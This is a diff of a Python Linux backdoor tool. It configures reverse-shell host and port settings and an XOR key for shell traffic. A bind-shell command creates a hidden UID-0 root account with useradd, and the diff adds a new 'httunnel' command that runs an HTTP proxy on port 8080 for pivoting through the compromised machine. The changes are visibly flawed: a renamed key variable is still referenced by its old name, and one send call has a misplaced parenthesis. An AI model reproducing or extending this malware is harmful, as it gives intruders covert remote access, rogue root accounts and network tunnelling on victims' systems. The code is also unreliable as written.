@@ -41,6 +41,7 @@ import struct
 import getpass
 import pwd
 import operator
+import SocketServer, SimpleHTTPServer
 
 cut = lambda s: str(s).split("\0",1)[0]
 
@@ -98,11 +99,12 @@ def environment():
    global RPORT
    global distro2
    global pin
+   global HPORT
 
-   # Change RHOST & RPORT accordingly if you're going to use the reverse shell   
-   RHOST = '127.0.0.1'
-   RPORT = 443
-   pin = 'XKIUKX'
+   RHOST = '127.0.0.1' # Remote host used in reverse shell
+   RPORT = 443         # Remote port used in reverse shell
+   pkey = 'XKIUKX'     # XOR Key for shell cipher
+   HPORT = 8080        # Port used for the HTTP Proxy feature in the reverse/bind shells
 
    distro = os.uname()[1]
    distro2 = platform.linux_distribution()[0]
@@ -701,7 +703,11 @@ def bindShell():
             strip = cmd.split(" ")
             acct = strip[1]
             os.system("/usr/sbin/useradd -M -o -s /bin/bash -u 0 -l " + acct)
-            conn.send(xor("[+] Root account " + acct + " has been created.\n", pin))   
+            conn.send(xor("[+] Root account " + acct + " has been created.\n", pin)) 
+        elif cmd2 == ("httunnel"):
+	    httpd = SocketServer.ForkingTCPServer(('', HPORT), Proxy)
+            conn.send(xor("[+] Serving HTTP proxy on port %s" % HPORT), pin)
+	    httpd.serve_forever()  
         elif cmd2.startswith('upload'):
             getname = cmd2.split(" ")
             rem_file = getname[1]
